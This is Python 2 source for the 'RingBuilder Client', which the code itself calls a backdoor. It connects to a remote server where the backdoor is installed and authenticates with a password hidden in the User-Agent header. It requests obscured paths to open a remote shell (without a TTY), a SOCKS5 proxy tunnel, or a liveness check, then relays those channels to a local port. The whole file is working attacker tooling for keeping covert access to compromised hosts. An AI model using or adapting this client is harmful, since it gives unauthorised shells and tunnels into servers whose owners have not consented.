#      RingBuilder Client
#----------------------------------
# Juan Manuel Fernandez (@TheXC3LL)


import socket
import argparse
import thread
import select
from errno import *

def banner():
    print "\n\t\t\t-=={RingBuilder Client}==-"
    print "\t\t\t         @TheXC3LL        \n"


def worker(afference, addr):
	print "\t[*] New Connection!"
	print "\t[*] Trying to reach RingBuilder..."
            
	if args.debug:
		print "\t[+] Connected to RingBuilder!"
        if args.shell:
                path = "/s4L4dD4ys"
        if args.socks5:
                path = "/w41t1ngR00M"

        ringbuilder = connector(path)
	ringbuilder.setblocking(0)
	afference.setblocking(0)
	while True:
		readable, writable, errfds = select.select([afference, ringbuilder], [], [], 60)
		for sock in readable:
			if sock is afference:
				message = afference.recv(2048)
				if len(message) == 0:
					print "\t[x] Service disconnected!"
					return
				if args.debug:
					print "\t\t--> Service"
					print message.encode("hex")
				ringbuilder.sendall(message)
			if sock is ringbuilder:
				data = ringbuilder.recv(2048)
				if len(data) == 0:
					print "\t[x] RingBuilder disconnected!"
					return
				if args.debug:
					print "\t\t<-- RingBuilder"
					print data.encode("hex")
				afference.sendall(data)

def relay():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        if args.socks5:
            point = int(args.socks5)
        if args.shell:
            point = int(args.shell)

        s.bind(("0.0.0.0",point))
    except Exception as err:
        print "[!] Error: could not bind to port"
	print err
        exit(0)

    s.listen(10)
    while True:
        clientsock, addr = s.accept()
        thread.start_new_thread(worker, (clientsock, addr))

def connector(endpoint):
	ringbuilder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		ringbuilder.connect((args.host, int(args.port)))
	except socket.error as err:
		if err.args[0] in (EINPROGRESS, EWOULDBLOCK):
			pass
		else:
			print "\t[!] Error: could not connect to ringbuilder. Host or port wrong?"
			print err
			return
	ringbuilder.send("GET " + endpoint + " HTTP/1.1\r\nHost: " + args.host + "\r\nUser-Agent: " + args.passwd + "\r\n\r\n")
	return ringbuilder

def ping():
         ringbuilder = connector("/h0p3")
         if (ringbuilder.recv(1024) == "Alive!"):
                 print "[+] RingBuilder is installed"
         else:
                 print "[-] RingBuilder is NOT installed"


parser = argparse.ArgumentParser(description='RingBuilder Client.')
parser.add_argument('--host', dest='host', help='RingBuilder Endpoint Host')
parser.add_argument('--port', dest='port', help='RingBuilder Endpoint Port')
parser.add_argument('--password', dest='passwd', help='RingBuilder Password')
parser.add_argument('--socks5', dest='socks5', help='Set port for proxychains')
parser.add_argument('--debug', dest='debug', action='store_true', help='Enable debug mode')
parser.add_argument('--ping', dest='ping', action='store_true', help='Check if backdoor still alive')
parser.add_argument('--shell', dest='shell', help="Set Local Port for shell (NO TTY)")
args = parser.parse_args()


if __name__ == '__main__':
	banner()
	if not args.host or not args.port or not args.passwd:
		print "[!] Error: please provide a valid endpoint and password (use -h to check syntax)"
		exit(-1)
        if args.socks5:
		print "[+] Starting local server for incoming connections at port " + args.socks5
		relay()
	if args.ping:
	   	ping()
	if args.shell:
                print "[+] Starting local server for incoming connections at port " + args.shell
                relay()
